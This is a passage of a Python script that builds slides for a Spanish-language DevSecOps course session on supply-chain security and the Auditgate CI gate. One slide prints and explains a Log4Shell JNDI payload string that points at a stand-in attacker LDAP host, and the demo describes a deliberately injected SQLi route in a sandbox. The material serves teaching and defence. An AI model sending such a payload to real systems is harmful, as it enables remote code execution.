"""Genera las slides de la sesión 4 (mismo sistema visual que las sesiones 1, 2 y 3).

Sesión 4 · Cadena de suministro y DevSecOps, anclada en Auditgate
(gate determinista que bloquea solo lo nuevo + agentes que no deciden el merge).

Uso:  python3 build.py [/_blob/<id-del-logo>]
"""
import html, json, pathlib, sys

HERE = pathlib.Path(__file__).resolve().parent
OUT = HERE / "slides"
OUT.mkdir(exist_ok=True)
LOGO = sys.argv[1] if len(sys.argv) > 1 else "/_blob/81762f76e0e02006203e5a8a9b3904d5"
SANS = "font-family:'IBM Plex Sans', Arial, sans-serif"
MONO = "font-family:'JetBrains Mono', 'Courier New', monospace"
E = html.escape
INK, PAPER, ORANGE, ORANGE_D, BLUE, MUTED, SOFT, CARD_D = "#12202B", "#F4F2EC", "#E8893A", "#A8520F", "#2F6FB0", "#4A5560", "#BCC8D2", "#1C2E3C"
GREEN, RED = "#2FB37A", "#E05252"
ORDER, SECTIONS = [], {}


def save(sid, body, notes, dark=False, gap=32, pad="112px 128px", extra="", fade=False):
    bg, fg = (INK, PAPER) if dark else (PAPER, INK)
    tr = ' data-transition="fade"' if fade else ""
    s = (f'<section id="{sid}"{tr} style="background:{bg};color:{fg};{SANS};padding:{pad};display:flex;'
         f'flex-direction:column;gap:{gap}px{extra}">\n{body}\n<aside>{E(notes)}</aside>\n</section>\n')
    (OUT / f"{sid}.html").write_text(s, encoding="utf-8")
    ORDER.append(sid)


def kicker(t, dark=False):
    return f'<p style="{MONO};font-size:28px;color:{ORANGE if dark else ORANGE_D};letter-spacing:2px">{E(t)}</p>'


def h2(t, dark=False, size=64):
    return f'<h2 style="font-size:{size}px;font-weight:700;line-height:1.1;color:{PAPER if dark else INK}">{t}</h2>'


def p(t, size=30, color=None, dark=False):
    c = color or (SOFT if dark else MUTED)
    return f'<p style="font-size:{size}px;color:{c};line-height:1.4">{t}</p>'


def code(lines, label=None, dark_box=True, size=26):
    bg, fg = (INK, PAPER) if dark_box else ("#FFFDF8", INK)
    bd = "" if dark_box else ";border:2px solid #D9D4C7"
    lab = f'<p style="font-size:26px;font-weight:600;color:{ORANGE if dark_box else ORANGE_D}">{E(label)}</p>' if label else ""
    return (f'<div style="background:{bg};padding:28px 32px;border-radius:16px{bd};display:flex;flex-direction:column;gap:12px">{lab}'
            f'<p style="{MONO};font-size:{size}px;color:{fg};line-height:1.5">{lines}</p></div>')


def table(head, rows, widths, size=27, hl=()):
    th = "".join(f'<th style="width:{w}%">{h}</th>' for h, w in zip(head, widths))
    tr = "".join(f'<tr{" style=\"background:#FBEBDD\"" if i in hl else ""}>' + "".join(f"<td>{c}</td>" for c in r) + "</tr>"
                 for i, r in enumerate(rows))
    return f'<table style="font-size:{size}px;color:{INK}"><tr>{th}</tr>{tr}</table>'


def cards(items, dark=False, size=28):
    out = []
    for icon, t, d in items:
        bg = CARD_D if dark else "#FFFDF8"
        bd = "" if dark else ";border:2px solid #D9D4C7"
        out.append(f'<div style="flex:1;background:{bg}{bd};border-radius:16px;padding:32px;display:flex;flex-direction:column;gap:16px">'
                   f'<x-icon name="{icon}" style="color:{ORANGE if dark else ORANGE_D};width:48px;height:48px"></x-icon>'
                   f'<p style="font-size:{size+2}px;font-weight:700;color:{PAPER if dark else INK}">{t}</p>'
                   f'<p style="font-size:{size-2}px;color:{SOFT if dark else MUTED};line-height:1.4">{d}</p></div>')
    return f'<div style="display:flex;gap:24px">{"".join(out)}</div>'


def section(key, desc):
    SECTIONS[key] = {"description": desc, "start": None}
    return key


def mark(key):
    SECTIONS[key]["start"] = ORDER[-1]


A = "&#160;&#160;"
OR = f'<span style="color:{ORANGE}">'
END = "</span>"
OK = f'<span style="color:{GREEN}">'
NO = f'<span style="color:{RED}">'

# ================================================================ S1 Encuadre
section("s1", "Encuadre: agenda de la tarde y puente con la sesión 3 (de la prueba al gate automático)")
save("cover", f'''<div style="display:flex;justify-content:space-between;align-items:center">
<img src="{LOGO}" alt="Universidad Católica de Pereira" style="width:420px;height:152px;object-fit:contain">
<p style="{MONO};font-size:26px;color:{SOFT};letter-spacing:2px;text-align:right">ESPECIALIZACIÓN EN DESARROLLO DE SOFTWARE<br>OPTATIVA I · COHORTE 2026-2</p>
</div>
<div style="display:flex;flex-direction:column;gap:32px">
<div style="width:120px;height:8px;background:{ORANGE};border-radius:4px"></div>
<h1 style="font-size:112px;font-weight:700;line-height:1.05;color:{PAPER}">Cadena de suministro y DevSecOps</h1>
<p style="font-size:44px;color:{SOFT};line-height:1.3">Sesión 4 · Un gate determinista que bloquea solo lo nuevo, y agentes que encuentran sin decidir el merge</p>
</div>
<div style="display:flex;justify-content:space-between;align-items:end">
<p style="font-size:32px;color:{PAPER}"><b>Ing. Jawy Andrés Romero</b></p>
<p style="{MONO};font-size:28px;color:{SOFT}">Viernes 20 de noviembre de 2026 · 5:00–10:00 p. m. · presencial</p>
</div>''', "La sesión 3 cerró con una promesa: la amenaza de la Billetera ya tenía su prueba (test_token_expira). Hoy esa prueba, Semgrep y el escaneo de dependencias dejan de correr en nuestras manos y empiezan a correr solos, en cada pull request, bloqueando el merge. El hilo del día es una sola plataforma real: Auditgate.",
     dark=True, pad="128px", extra=";justify-content:space-between", fade=True)
mark("s1")

save("agenda", kicker("HOY · 5:00 A 10:00 P. M.") + h2("De la prueba de ayer al gate automático de hoy") + table(
    ["Hora", "Bloque", "Producto"],
    [["5:00", "Repaso y el problema: pipelines que alertan pero no bloquean", "El pipeline como superficie de ataque"],
     ["5:30", "<b>El gate determinista</b> · bloquea solo lo nuevo (diff-aware)", "Demo: <code>auditgate scan</code>"],
     ["6:10", "<b>El PR que bloquea</b> · shift-left de verdad + triage con IA", "Demo: PR en el sandbox"],
     ["7:00", "Pausa", ""],
     ["7:15", "<b>Cadena de suministro</b> · SCA, SBOM, firma, SLSA, WIF", "Endurecer el pipeline mismo"],
     ["8:15", "<b>Codify</b> · de un hallazgo a una regla con prueba", "Regla Semgrep + fixture"],
     ["8:45", "<b>Lab 3</b> · instalar el gate en el repo del equipo", "Entregable del 7,5 %"],
     ["9:30", "<b>Entregable 1</b> del proyecto · secciones 1 a 3", "Modelo de amenazas + tabla ASVS"],
     ["9:50", "Cierre y sesión 5", "El arco completo de las cinco sesiones"]],
    [12, 56, 32], size=25, hl=(1, 2, 6)),
    "Las filas resaltadas son las dos demos en vivo y el laboratorio. Cada bloque teórico termina tocando la plataforma real: no hay slide de arquitectura sin su comando que la ejecuta.", gap=28)

save("repaso", kicker("AYER · LA PRUEBA QUEDÓ ESCRITA", True) + h2("Ya sabemos verificar. Falta que no dependa de nosotros.", True) + cards([
    ("Check", "La amenaza tiene prueba", "token-ana nunca expiraba → test_token_expira_en_15_minutos. Pasa en verde. Hoy."),
    ("Warning", "Pero corre a mano", "La prueba, Semgrep y ZAP solo valen si alguien se acuerda de correrlos antes de subir el código."),
    ("Code", "Y el código nuevo entra igual", "Nada impide que el próximo commit reintroduzca el SQLi que arreglamos. El verde de ayer no protege el merge de mañana."),
], dark=True) + p("Hoy convertimos «yo lo verifico» en «el pipeline lo exige, en cada cambio».", 34, dark=True),
    "Conectar directo con la trazabilidad de la sesión 3. El problema que resolvemos hoy no es encontrar la falla (eso ya lo hicimos con ASVS), es impedir que vuelva a entrar sin que nadie lo note.", dark=True, gap=40)

# ================================================================ S2 El problema
section("s2", "El problema: pipelines que alertan pero no bloquean, y el pipeline mismo como superficie de ataque")
save("alerta", kicker("5:00 · EL PROBLEMA") + h2("El pipeline que alerta pero no bloquea") + code(
    f'name: security<br>jobs:<br>{A}sast:{A}{A}<span style="color:{SOFT}"># corre Semgrep…</span><br>'
    f'{A}{A}continue-on-error: {NO}true{END}{A}{A}<span style="color:{SOFT}"># …y sigue aunque falle</span><br>'
    f'{A}deps:{A}{A}continue-on-error: {NO}true{END}<br>'
    f'{A}container:{A}continue-on-error: {NO}true{END}',
    label="pipeline-tipico.yml", size=26) + p(
    f"Doce escáneres, un montón de anotaciones rojas en la pestaña Actions, y <b>{NO}main sigue en verde{END}</b> con las vulnerabilidades adentro. El equipo se acostumbra al ruido y deja de mirarlo.", 32) +
    p("Un reporte que no bloquea no es un control: es una métrica de culpa.", 28, color=ORANGE_D),
    "Preguntar a la clase: ¿en sus empresas el pipeline de seguridad falla el build o solo comenta? La respuesta casi siempre es «solo comenta». Ese es el patrón que vamos a romper hoy.", gap=24)
mark("s2")

save("superficie", kicker("Y HAY ALGO PEOR") + h2("El pipeline mismo es superficie de ataque") + cards([
    ("Code", "Actions sin fijar", "uses: action@v4 resuelve a lo que el autor publique hoy. Quien controle el tag, controla tu CI."),
    ("Users", "Tokens con permisos de más", "GITHUB_TOKEN con write por defecto: un step comprometido puede empujar a main o publicar un release."),
    ("Database", "Secretos de larga vida", "Llaves que no expiran, guardadas en Secrets y expuestas a cada workflow de cada fork que abra un PR."),
], dark=True) + p("La seguridad de tu software ya no termina en tu código: incluye cómo lo construyes y con qué lo construyes.", 32, dark=True),
    "Este es el puente a cadena de suministro. El atacante moderno no entra por tu endpoint: entra por una dependencia o por tu propio pipeline, que tiene acceso a todo.", dark=True, gap=36)

save("incidentes", kicker("NO ES TEORÍA · 2021–2025") + h2("Tres golpes a la cadena de suministro") + table(
    ["Incidente", "Qué pasó", "Lección"],
    [["<b>Log4Shell</b> (2021)", "Una línea en una librería de logs transitiva → RCE en medio internet. Nadie sabía que la usaba.",
      "Necesitas un <b>SBOM</b>: saber qué usas, incluso lo que no elegiste."],
     ["<b>tj-actions</b> (2025)", "Una GitHub Action popular fue comprometida y filtró secretos de miles de pipelines.",
      "Fija las actions <b>por SHA</b>, no por tag. El tag se puede mover."],
     ["<b>Shai-Hulud</b> (2025)", "Gusano en npm: paquetes que al instalarse robaban tokens y se auto-publicaban en otros.",
      "El <code>install</code> ejecuta código. Mínimo privilegio y <b>firma</b> de lo que publicas."]],
    [20, 50, 30], size=24),
    "Los tres son la misma historia: el código propio estaba limpio y aún así cayeron. Por eso la sesión de hoy no es sobre tu app, es sobre todo lo que la rodea.", gap=24)

_PAYLOAD = "${jndi:ldap://attacker-ldap:1389/Exploit}"


def _seg(chip, label, col, tint):
    return (f'<div style="display:flex;flex-direction:column;gap:10px;align-items:center">'
            f'<div style="{MONO};font-size:27px;font-weight:600;color:{col};background:{tint};'
            f'border:2px solid {col};border-radius:12px;padding:12px 16px;white-space:nowrap">{E(chip)}</div>'
            f'<p style="font-size:18px;color:{MUTED};text-align:center;max-width:190px;line-height:1.2">{E(label)}</p></div>')


_chain = '<div style="display:flex;gap:12px;align-items:center">' + (
    '<x-shape kind="arrow-right" style="background:#E8893A;width:44px;height:26px"></x-shape>'.join(
        f'<div style="flex:1;background:#FFFDF8;border:2px solid #D9D4C7;border-radius:14px;padding:18px;text-align:center">'
        f'<p style="{MONO};font-size:19px;color:{ORANGE_D}">{a}</p>'
        f'<p style="font-size:21px;color:{INK};line-height:1.25;margin-top:6px">{b}</p></div>'
        for a, b in [("1", "el texto llega a <b>log.info()</b>"),
                     ("2", "log4j ve <b>${jndi}</b> y lo resuelve"),
                     ("3", "LDAP→HTTP: baja <b>Exploit.class</b>"),
                     ("4", "la JVM la carga → <b>RCE</b>")])) + '</div>'

save("jndi", kicker("CÓMO FUNCIONA LOG4SHELL") + h2("Anatomía de una sola cadena de texto", size=52) +
     f'<div style="{MONO};font-size:34px;color:{INK};background:#FFFDF8;border:2px solid #D9D4C7;border-radius:14px;padding:20px 26px;text-align:center">{E(_PAYLOAD)}</div>' +
     '<div style="display:flex;gap:14px;justify-content:space-between">' +
     _seg("${", "lookup de log4j", ORANGE_D, "#FBEBDD") +
     _seg("jndi:", "la API JNDI de Java", BLUE, "#E7F0F8") +
     _seg("ldap://", "por el protocolo LDAP", "#6D4FA3", "#EFEAF7") +
     _seg("attacker-ldap:1389", "servidor del atacante", RED, "#FBE9E9") +
     _seg("/Exploit", "clase remota a cargar", RED, "#FBE9E9") +
     _seg("}", "cierra el lookup", MUTED, "#F0EEE6") +
     '</div>' + _chain +
     p("Le dice a log4j: «ve por LDAP a ese servidor, pide <code>Exploit</code> y carga lo que te devuelva». log4j 2.14.1 <b>obedece</b>: trató un <b>dato</b> (lo que iba a loguear) como una <b>instrucción</b>. Mismo patrón que la inyección de prompts.", 27),
     "El corazón técnico de Log4Shell. La idea que debe quedar: no es un comando ni un binario, es texto que parece inofensivo y pasa cualquier validación. Basta con que llegue a un log. El fix de 2.17 fue dejar de interpretar ${jndi:} dentro de los mensajes. Conecta con la sesión 5: confundir dato con orden es la misma falla en LLM.",
     gap=22)

# ================================================================ S3 El gate
section("s3", "El gate determinista de Auditgate: bloquea solo lo nuevo, mismo motor en tu máquina y en CI")
save("auditgate", kicker("5:30 · LA RESPUESTA") +
     '<div style="display:flex;flex-direction:column;gap:24px">' +
     h2("Auditgate: el determinismo bloquea, el agente descubre", size=58) +
     p("Plataforma open source de seguridad para CI/CD. Nació como <b>Bunker DevSecOps</b>, el workshop de Tribu, Hacklab Bogotá y Ethereum Bogotá con Mantishield (500+ asistentes).", 30) + '</div>' +
     cards([("Check", "Gate determinista", "El único check requerido. Reglas con prueba, sin IA. Bloquea el merge. Siempre da el mismo resultado."),
            ("Users", "Agentes de IA", "Encuentran, priorizan y ayudan a codificar. Comentan en el PR. <b>Nunca deciden un merge.</b>"),
            ("Code", "Un solo motor", "El mismo código corre en tu terminal (CLI) y en GitHub Actions. Lo que pasa local, pasa en CI.")]) +
     p("La frase que resume la plataforma: <b>el agente descubre y prioriza; el determinismo bloquea.</b>", 30, color=ORANGE_D),
     "Separar los dos roles es la idea central. La IA es buenísima encontrando y explicando, pero no es determinista: no puede ser quien decide si un PR entra. Eso lo decide una regla con una prueba que pasa o no pasa.", gap=28)
mark("s3")

save("metodologia", kicker("DE DÓNDE SALEN LAS REGLAS") + h2("Find → Validate → Extract → Codify → Scale") +
     f'''<div style="display:flex;gap:12px;align-items:stretch">{"<x-shape kind=\"arrow-right\" style=\"background:#E8893A;width:48px;height:28px;align-self:center\"></x-shape>".join(
         f'<div style="flex:1;background:#FFFDF8;border:2px solid #D9D4C7;border-radius:14px;padding:24px;display:flex;flex-direction:column;gap:10px"><p style="{MONO};font-size:22px;color:{ORANGE_D}">{a}</p><p style="font-size:24px;color:{INK};font-weight:700">{b}</p><p style="font-size:21px;color:{MUTED};line-height:1.3">{c}</p></div>'
         for a, b, c in [("FIND", "Agente", "Auditoría semanal: map → hunt → refute → extract"),
                         ("VALIDATE", "Humano", "Reproduce con PoC. Sin esto, ningún hallazgo bloquea"),
                         ("EXTRACT", "Humano+IA", "El patrón generalizable, no el bug puntual"),
                         ("CODIFY", "Regla", "Semgrep + fixture con test. El gate exige que pase"),
                         ("SCALE", "Plataforma", "El reusable workflow lo lleva a cada repo")])}</div>''' +
     p("Metodología del GitHub Security Lab. El agente nunca salta el paso humano: un hallazgo de IA sin PoC validado jamás bloquea un PR.", 30),
     "Este es el guardarraíl ético y técnico. La IA propone, el humano valida, la regla determinista es lo único que bloquea. Así la plataforma escala sin convertir falsos positivos en muros.", gap=32)

save("diff", kicker("LA DECISIÓN DE DISEÑO CLAVE", True) + h2("Bloquea solo lo <span style=\"color:#E8893A\">nuevo</span>, no toda la deuda", True) +
     '<div style="display:flex;gap:24px">' +
     f'<div style="flex:1;background:{CARD_D};border-radius:16px;padding:32px;display:flex;flex-direction:column;gap:14px"><p style="{MONO};font-size:24px;color:{RED}">GATE NO DIFF-AWARE</p><p style="font-size:28px;color:{PAPER};line-height:1.4">73 hallazgos viejos + 1 nuevo = <b>74 en rojo</b>. El equipo apaga el gate la primera semana.</p></div>' +
     f'<div style="flex:1;background:{CARD_D};border-radius:16px;padding:32px;display:flex;flex-direction:column;gap:14px"><p style="{MONO};font-size:24px;color:{GREEN}">AUDITGATE</p><p style="font-size:28px;color:{PAPER};line-height:1.4">La deuda vieja es <b>deuda, no bloquea</b>. Solo el hallazgo nuevo de este PR tumba el merge.</p></div>' +
     '</div>' + p("Un gate que bloquea todo se desactiva. Un gate que bloquea solo lo que <b>tú</b> introdujiste, se respeta. Comparas contra el merge-base de la rama, no contra el absoluto.", 32, dark=True),
     "Esta es la razón por la que los gates fracasan en la vida real: encienden sobre un repo con años de deuda y lo primero que hacen es bloquear a todo el mundo. Auditgate solo te hace responsable de lo que agregas.", dark=True, gap=40)

save("demo-scan", kicker("6:00 · DEMO EN VIVO") + h2("El mismo gate, en tu terminal") + code(
    f'$ auditgate scan<br>'
    f'Auditgate scan — base origin/main → HEAD<br>'
    f'{A}Lenguajes: python (26)<br>'
    f'{A}{OK}✔{END} secrets{A}gitleaks{A}{A}0 nuevos<br>'
    f'{A}{NO}✖{END} sast{A}{A}{A}semgrep{A}{A}{A}<b style="color:{RED}">15 nuevo(s) — BLOQUEA</b><br>'
    f'{A}{A}{A}{A}vulnerable_app/app.py:40{A}tainted-sql-string{A}<span style="color:{SOFT}">(SQLi)</span><br>'
    f'{A}{A}{A}{A}vulnerable_app/app.py:54{A}command-injection-shell-true<br>'
    f'{A}{A}{A}{A}<span style="color:{SOFT}">… y 7 más (usa --json para el detalle)</span><br>'
    f'{A}{OK}✔{END} deps{A}{A}{A}osv-scanner 0 nuevos{A}<span style="color:{SOFT}">(73 previas: deuda, no bloquea)</span><br>'
    f'{A}{OK}✔{END} actions{A}auditgate{A}{A}fijadas por SHA<br>'
    f'<b style="color:{RED}">🚫 Bloqueado: 15 hallazgo(s) nuevo(s).</b>{A}<span style="color:{SOFT}">exit 1</span>',
    label="corre en un worktree temporal de tu último commit · no toca tus archivos", size=23) +
    p("Lee la salida completa: cuatro controles, la deuda vieja separada de lo nuevo, y <code>exit 1</code> que en CI es el merge bloqueado.", 28),
    "Correr esto en vivo desde Tribu-Lab. Es la slide ancla de la clase: toda la tesis del día cabe en esta pantalla. Si la demo del sandbox fallara por red, esta sola sostiene el punto.", gap=22)

save("cli-ci", kicker("POR QUÉ IMPORTA EL CLI") + h2("Si pasa en tu máquina, pasa en el PR") + cards([
    ("Code", "auditgate scan", "El gate antes del push. Exit 0 pasa · 1 bloquea · 2 error. Mismas reglas que CI, instaladas aparte."),
    ("Check", "auditgate scan --json", "Salida estructurada para agentes. En tu CLAUDE.md: «antes de abrir un PR, corre scan y corrige lo blocked»."),
    ("Users", "auditgate init", "Instala el workflow en el repo (.github/workflows/auditgate.yml). El reusable workflow hace el trabajo."),
], dark=True) + p("El agente recibe la misma política que el gate y no puede saltársela: el merge lo sigue decidiendo CI, nunca el modelo.", 30, dark=True),
    "El punto de enseñanza: shift-left real es que el desarrollador (o su agente) vea el mismo veredicto ANTES de abrir el PR. Nada de sorpresas en CI. El CLI y el workflow comparten código.", dark=True, gap=32)

# ================================================================ S4 El PR que bloquea
section("s4", "El PR que bloquea en el sandbox, y el triage con IA que comenta pero nunca bloquea")
save("shiftleft", kicker("6:10 · SHIFT-LEFT DE VERDAD") + h2("El control se mueve al pull request") +
     f'''<div style="display:flex;gap:16px;align-items:center">{"<x-shape kind=\"arrow-right\" style=\"background:#E8893A;width:56px;height:30px\"></x-shape>".join(
         f'<div style="flex:1;background:#FFFDF8;border:2px solid #D9D4C7;border-radius:16px;padding:28px;display:flex;flex-direction:column;gap:10px"><p style="{MONO};font-size:22px;color:{ORANGE_D}">{a}</p><p style="font-size:26px;color:{INK};line-height:1.3">{b}</p></div>'
         for a, b in [("DEV", "auditgate scan local: ve el bloqueo antes de subir"),
                      ("PR", "El Security Gate corre en cada push al PR"),
                      ("GATE", "Bloquea el merge si hay algo nuevo"),
                      ("MERGE", "Entra solo cuando el gate está en verde")])}</div>''' +
     p("El <b>Security Gate</b> es el único check requerido en la rama protegida. Branch protection no deja hacer merge mientras esté en rojo. El determinismo, no una persona, es quien cierra la puerta.", 32),
     "Mostrar la configuración de branch protection: required status check = Security Gate. Esa es la pieza que convierte un reporte en un control de verdad.", gap=32)
mark("s4")

save("demo-pr", kicker("6:25 · DEMO EN VIVO · SANDBOX") + h2("Abrir un PR y ver el gate bloquear") + code(
    f'<span style="color:{SOFT}"># en Jawy77/auditgate-sandbox</span><br>'
    f'git checkout -b feature/nueva-ruta<br>'
    f'<span style="color:{SOFT}"># agrego una ruta con SQLi: f"...WHERE id = {{req.args[\'id\']}}"</span><br>'
    f'git commit -am "feat: buscar por id" && git push -u origin HEAD<br>'
    f'gh pr create --fill<br><br>'
    f'<span style="color:{SOFT}"># en el PR, segundos después:</span><br>'
    f'{NO}✖{END} Security Gate{A}{A}<b style="color:{RED}">failing</b>{A}{A}1 nuevo: flask.sqli-string-built-query<br>'
    f'{OK}🤖 Triage{END}{A}{A}comentó: TP · alcanzable desde la ruta · fix sugerido<br>'
    f'<span style="color:{SOFT}">Merge button:</span> {NO}bloqueado{END}',
    label="el PR entra en rojo; el merge no se puede hacer", size=23) +
    p("Lo nuevo bloquea; el bot de triage explica. Arreglo el SQLi, push, el gate pasa a verde y el merge se habilita. En vivo.", 28),
    "Este es el momento más frágil de la clase (depende de la red y de Actions). Tener un PR de respaldo ya abierto por si el push en vivo tarda. Si falla, la slide demo-scan sostiene el punto y mostramos un PR histórico.", gap=22)

save("triage", kicker("EL AGENTE QUE NO DECIDE", True) + h2("Triage con IA: comenta, nunca bloquea", True) + cards([
    ("Check", "Qué aporta", "Por cada hallazgo nuevo: verdadero/falso positivo, si es alcanzable, y un fix sugerido, como comentario en el PR."),
    ("Warning", "Qué NO hace", "No marca checks, no aprueba, no hace merge. Si el modelo se equivoca, el gate determinista sigue mandando."),
    ("Database", "Tu modelo, tu llave", "Claude, Grok, OpenAI o compatible (Ollama, OpenRouter). La llave viaja por stdin, cifrada en el Environment del job."),
], dark=True) + p("Con Claude puedes no tener llave: <b>Workload Identity Federation</b> (OIDC de GitHub). Sin secretos de larga vida en el repo.", 30, dark=True),
    "El guardarraíl: la IA es consejera, no autoridad. Aun con un triage alucinado, un PR no entra si el gate está rojo, y no se bloquea injustamente porque el triage no marca checks. WIF es el patrón sin llaves que vemos en el bloque de cadena de suministro.", dark=True, gap=32)

# ================================================================ S5 Cadena de suministro
section("s5", "Cadena de suministro: SCA, SBOM, firma de artefactos, SLSA y autenticación sin llaves")
save("sca", kicker("7:15 · CADENA DE SUMINISTRO") + h2("No puedes proteger lo que no sabes que usas") + code(
    f'$ auditgate scan --checks deps<br>'
    f'{A}deps{A}{A}osv-scanner{A}<span style="color:{SOFT}">(ecosistemas: PyPI · npm · Go · Maven · crates…)</span><br>'
    f'{A}{A}transitivas incluidas{A}<span style="color:{SOFT}"># la dependencia de tu dependencia</span>',
    label="SCA · Software Composition Analysis", size=25) +
    cards([("Database", "SCA", "osv-scanner cruza tus dependencias (directas y transitivas) contra la base OSV. Multi-ecosistema."),
           ("Code", "SBOM", "La lista de materiales de tu software. Cuando salga el próximo Log4Shell, en un grep sabes si te toca."),
           ("Check", "Diff-aware también aquí", "Una CVE nueva introducida por tu PR bloquea; la deuda de CVEs previas se reporta como deuda.")]),
    "Log4Shell fue tan grave porque nadie tenía SBOM: no sabían qué versiones de log4j corrían en producción. El SBOM convierte una semana de pánico en una consulta.", gap=24)
mark("s5")

save("firma", kicker("¿Y LO QUE TÚ PUBLICAS?") + h2("Firmar el artefacto: que nadie lo cambie en el camino") + table(
    ["Pieza", "Qué garantiza", "En Auditgate (release.yml)"],
    [["<b>SBOM</b>", "Qué hay dentro del artefacto", "Se genera y se adjunta a cada release"],
     ["<b>Provenance SLSA</b>", "Quién lo construyó, desde qué commit, con qué workflow", "Atestación firmada por el pipeline"],
     ["<b>cosign keyless</b>", "La firma, sin manejar llaves privadas de larga vida", "Firma con identidad OIDC efímera (Sigstore)"],
     ["<b>SHA pinning</b>", "Que la action que corres sea exactamente la que revisaste", "Todas las actions fijadas por SHA, no por tag"]],
    [20, 44, 36], size=24) +
    p("Firmar sin guardar una llave privada es posible: <b>keyless</b>. La identidad del workflow (OIDC) firma por un instante y se descarta.", 28),
    "Esto responde la otra mitad de la cadena de suministro: no solo consumo seguro (SCA/SBOM), sino producción confiable (firma/provenance). SLSA es el estándar; cosign keyless es cómo se hace sin el dolor de gestionar llaves.", gap=22)

save("privilegio", kicker("ENDURECER EL PIPELINE MISMO") + h2("Mínimo privilegio y cero llaves de larga vida", True) + cards([
    ("Code", "Actions por SHA", "uses: actions/checkout@<sha>. El tag v4 se puede mover a código malicioso; el SHA no. (tj-actions)"),
    ("Users", "Permisos mínimos", "permissions: contents: read por defecto. Cada job pide solo lo que necesita, no write global."),
    ("Database", "WIF, sin secretos", "Workload Identity Federation: el job se autentica con el OIDC de GitHub. No hay llave que robar ni rotar."),
], dark=True) + p("La regla <code>auditgate-actions</code> verifica esto en tu propio pipeline: un workflow con una action sin fijar es un hallazgo que bloquea.", 30, dark=True),
    "Cierre del bloque: la plataforma se aplica a sí misma. El pipeline que revisa tu código está, él mismo, endurecido con estas tres cosas. Practica lo que predica.", dark=True, gap=32)

save("secretos", kicker("LO QUE QUEDA EN EL HISTORIAL") + h2("Un secreto borrado sigue en el commit anterior") + code(
    f'$ git rm config.py && git commit -m "quita llave"{A}<span style="color:{SOFT}"># ❌ no basta</span><br>'
    f'$ auditgate scan --checks secrets<br>'
    f'{A}secrets{A}gitleaks{A}<span style="color:{RED}">1 nuevo</span>{A}<span style="color:{SOFT}"># lo encuentra en el historial del diff</span>',
    label="gitleaks revisa el diff, no solo el árbol actual", size=25) +
    p("Borrar el archivo no borra la llave: sigue en el historial de git, clonable por cualquiera. La respuesta correcta es <b>rotar la llave</b>, no solo quitar el archivo. El gate te obliga a notarlo antes del merge.", 32) +
    p("Por eso los secretos nunca van al código: van al vault del Environment, inyectados solo al job que los necesita.", 28, color=ORANGE_D),
    "Conecta con la demo de secretos y con la vida real: casi todos han comiteado una llave alguna vez. La lección que se queda: rotar, no ocultar. El gate detecta el intento de ocultar.", gap=24)

# ================================================================ S6 Codify
section("s6", "Codify: de un hallazgo puntual a una regla con prueba que el gate exige")
save("codify", kicker("8:15 · CODIFY") + h2("De un bug encontrado a una regla que lo impide siempre") +
     '<div style="display:flex;gap:24px">' +
     f'<div style="flex:1;background:#FFFDF8;border:2px solid #D9D4C7;border-radius:16px;padding:32px;display:flex;flex-direction:column;gap:14px"><p style="{MONO};font-size:24px;color:{RED}">ARREGLAR EL BUG</p><p style="font-size:28px;color:{INK};line-height:1.4">Corriges este SQLi en esta línea. Mañana alguien escribe el mismo patrón dos archivos más allá.</p></div>' +
     f'<div style="flex:1;background:#FFFDF8;border:2px solid #D9D4C7;border-radius:16px;padding:32px;display:flex;flex-direction:column;gap:14px"><p style="{MONO};font-size:24px;color:{GREEN}">CODIFICAR EL PATRÓN</p><p style="font-size:28px;color:{INK};line-height:1.4">Escribes una regla que reconoce el patrón. El gate la exige. Nadie vuelve a introducirlo, nunca.</p></div>' +
     '</div>' + p("Extraer el <b>patrón generalizable</b>, no el bug puntual. Es la diferencia entre apagar un incendio y prohibir los fósforos.", 32),
     "El salto conceptual de la sesión: cada incidente real debería terminar en una regla, no solo en un fix. Así la organización no repite el mismo error. Esto es platform engineering aplicado a seguridad.", gap=32)
mark("s6")

save("regla", kicker("UNA REGLA DE AUDITGATE") + h2("La regla trae su propia prueba") + code(
    f'<span style="color:{SOFT}"># src/auditgate/rules/ · regla + fixture con test</span><br>'
    f'rules:<br>'
    f'{A}- id: {ORANGE}flask.command-injection-shell-true{END}<br>'
    f'{A}{A}pattern: subprocess.$F(..., shell=True)<br>'
    f'{A}{A}message: "Ejecución de shell con entrada no confiable"<br>'
    f'{A}{A}severity: ERROR<br>'
    f'<span style="color:{SOFT}"># tests/: un caso que DEBE marcar + uno que NO debe (falso positivo)</span>',
    label="auditgate-flask.yml", size=24) +
    p(f"Toda regla de Auditgate se entrega con fixtures: un caso vulnerable que <b>debe</b> detectar y un caso seguro que <b>no debe</b> marcar. <b>El gate exige que esas pruebas pasen</b> antes de aceptar la regla.", 30),
    "El meta-punto: las reglas también se testean. Una regla sin prueba es tan peligrosa como código sin prueba: falsos positivos que entrenan al equipo a ignorar el gate. Reglas con tests = gate confiable.", gap=22)

save("scale", kicker("SCALE · PAVED ROAD", True) + h2("Una regla, todos los repos", True) +
     code(f'<span style="color:{SOFT}"># cualquier repo consume la plataforma con ~10 líneas</span><br>'
          f'jobs:<br>{A}seguridad:<br>'
          f'{A}{A}uses: {ORANGE}Jawy77/auditgate/.github/workflows/security-platform.yml@&lt;sha&gt;{END}<br>'
          f'{A}{A}secrets: inherit',
          label="el reusable workflow (paved road)", size=23, dark_box=True) +
     p("<b>Security Platform Engineering</b>: la seguridad como producto interno. Un camino pavimentado que cada repo hereda. Mejoras la regla una vez, y cada repo que consume el workflow la recibe.", 32, dark=True),
     "Cierre de Codify: así escala. No persigues 40 repos pidiendo que arreglen lo mismo; publicas la regla en el workflow central y todos la heredan. Find→Codify→Scale completa el círculo.", dark=True, gap=28)

# ================================================================ S7 Lab 3 + Entregable
section("s7", "Laboratorio 3 y Entregable 1 del proyecto: el equipo instala el gate en su repo")
save("lab3", kicker("8:45 · LABORATORIO 3 · 7,5 %") + h2("Instala el gate en el repo del equipo") + table(
    ["Paso", "Qué hace el equipo", "Evidencia"],
    [["1", "<code>pipx install auditgate</code> y <code>auditgate init</code> en su repo", "El workflow commiteado"],
     ["2", "Abre un PR con un cambio que introduce una falla (SQLi, secreto o dep vulnerable)", "El Security Gate en rojo"],
     ["3", "Lee el comentario del triage: TP/FP, alcanzabilidad, fix", "Captura del comentario"],
     ["4", "Corrige, hace push, el gate pasa a verde", "El PR mergeable"],
     ["5", "<b>Codify</b>: escribe o adapta una regla para una amenaza de su Lab 1, con su prueba", "La regla + test que pasa"]],
    [8, 64, 28], size=25, hl=(4,)) +
